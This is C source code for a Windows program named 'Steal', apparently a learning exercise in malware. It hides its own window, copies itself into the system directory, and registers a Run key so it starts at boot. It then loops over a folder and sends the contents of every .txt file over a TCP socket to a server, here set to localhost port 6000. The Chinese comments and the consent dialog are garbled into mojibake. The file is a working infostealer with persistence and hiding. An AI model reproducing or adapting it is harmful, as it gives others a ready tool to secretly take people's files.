#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h> 
#include <windows.h> 
#include <io.h> 

#pragma comment(lib, "ws2_32.lib") 

int SendtoServer(const char* path) 
{
	//0 ��ʼ������� 
	// �����׽��ֿ� 
	WORD wVersionRequested; 
	WSADATA wsaData; 
	int err; 
	char sendBuf[1024] = {0}; 
	wVersionRequested = MAKEWORD(2, 2);
	// 1����ʼ���׽��ֿ� 
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0) 
	{ 
		printf("WSAStartup errorNum = %d\n", GetLastError());
		system("pause"); 
		return err; 
	}
	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2)
	{ 
		printf("LOBYTE errorNum = %d\n", GetLastError()); 
		WSACleanup();
		system("pause"); 
		return -1; 
	}
	// 2 ��װ�绰�� 
	// �½��׽��� 
	SOCKET sockCli = socket(AF_INET, SOCK_STREAM, 0);
	if (INVALID_SOCKET == sockCli) 
	{
		printf("socket errorNum = %d\n", GetLastError());
		system("pause");
		return -1;
	}
	SOCKADDR_IN addrSrv; 
	addrSrv.sin_addr.S_un.S_addr = inet_addr("127.0.0.1"); 
	addrSrv.sin_family = AF_INET;
	addrSrv.sin_port = htons(6000); 
	// 3 ���ӷ����� 
	if (SOCKET_ERROR == connect(sockCli, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR)))
	{ 
		printf("connect errorNum = %d\n", GetLastError());
		system("pause");
		return -1;
	}
	// 4 ��ȡ�ļ�����
	FILE* fp = fopen(path, "rb"); 
	int len = fread(sendBuf, 1, 1024, fp);
	fclose(fp);
	// 5 �������� 
	int iLen = send(sockCli, sendBuf, strlen(sendBuf) + 1, 0); 
	if (iLen < 0) 
	{
		printf("send errorNum = %d\n", GetLastError());
		system("pause"); 
		return -1; 
	}
	// �ر��׽��� 
	closesocket(sockCli); //
	WSACleanup(); 
	return 0;
}

int DoSteal(const char *szPath) 
{ 
	// 1 ���� szPath �����е��ļ� 
	WIN32_FIND_DATA FindFileData;// FindFileData ��ʾ�ļ� 
	HANDLE hListFile; //�ļ��þ������ʶ����� 
	char szFilePath[MAX_PATH] = {0}; 
	strcpy(szFilePath, szPath);
	strcat(szFilePath, "\\*"); 
	// 2 �����ҵ���һ���ļ�,�� hListFile ��ʶ 
	hListFile = FindFirstFile(szFilePath, &FindFileData); 
	// 3 ѭ�����������ļ� 
	do
	{ 
		char mypath[MAX_PATH] = { 0 }; 
		strcpy(mypath, szPath);
		strcat(mypath, FindFileData.cFileName);
		if (strstr(mypath, ".txt")) //txt �ļ� 
		{ 
			//����������ʼ��ȡ�ļ� 
			SendtoServer(mypath);
			printf("mypath = %s\n", mypath);
		}
	} while (FindNextFile(hListFile, &FindFileData)); //FindNextFile �ķ���ֵΪ NULL���˳�ѭ�� 
	return 0;
}

void AddToSystem()
{
	HKEY hKEY; 
	char CurrentPath[MAX_PATH];
	char SysPath[MAX_PATH];
	long ret = 0; 
	LPSTR FileNewName; 
	LPSTR FileCurrentName; 
	DWORD type = REG_SZ;
	DWORD size = MAX_PATH;
	LPCTSTR Rgspath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; //regedit win + R 
	GetSystemDirectory(SysPath, size);
	GetModuleFileName(NULL, CurrentPath, size); //Copy File 
	FileCurrentName = CurrentPath; FileNewName = lstrcat(SysPath, "\\Steal.exe");
	struct _finddata_t Steal;
	printf("ret1 = %d,FileNewName = %s\n", ret, FileNewName);
	if (_findfirst(FileNewName, &Steal) != -1) 
		return;//�Ѿ���װ�� 
	printf("ret2 = %d\n", ret); 
	int ihow = MessageBox(0, "�ó���ֻ�������ںϷ�����;��\n �������иó���ʹ��̨���� ���ڱ���ص�״̬��\n ����������������밴��ȡ������ť�˳���\n ���¡��ǡ���ť�ó��򽫱����� �����Ļ����ϣ�����ϵͳ�����Զ����С�\n ���¡��񡱰�ť������ֻ����һ�Σ�����������ϵͳ������ �κζ�����", "����", MB_YESNOCANCEL | MB_ICONWARNING | MB_TOPMOST);
	if (ihow == IDCANCEL) 
		exit(0); 
	if (ihow == IDNO)
		return;//ֻ����һ��
	//�����ļ� 
	ret = CopyFile(FileCurrentName, FileNewName, TRUE);
	if (!ret) 
	{ 
		return;
	}//����ע��� 
	printf("ret = %d\n", ret);
	ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, Rgspath, 0, KEY_WRITE, &hKEY);
	if (ret != ERROR_SUCCESS) 
	{ 
		RegCloseKey(hKEY); 
		return;
	}//Set Key
	ret = RegSetValueEx(hKEY, "Steal", NULL, type, (const unsigned char*)FileNewName, size);
	if (ret != ERROR_SUCCESS)
	{ 
		RegCloseKey(hKEY);
		return; 
	}
	RegCloseKey(hKEY); 
}

void HideMyself() // ���ش���
{ 
	// �õ���ǰ�Ĵ��ھ��
	HWND hwnd = GetForegroundWindow();
	ShowWindow(hwnd, SW_HIDE);
}

int main() 
{ 
	printf("Steal\n"); 
	//�������� 
	HideMyself(); 
	// ��ӵ������� 
	AddToSystem(); 
	//��ȡ�ļ� ��ȡ�ĸ��ļ��أ��� 
	while (1) 
	{ 
		DoSteal("C:\\Users\\20613\\Desktop\\test\\"); //������Ҫ�������һ���ļ��е�·��,��������������"\\"
		Sleep(5000);
	}
	system("pause"); 
	return 0; 
}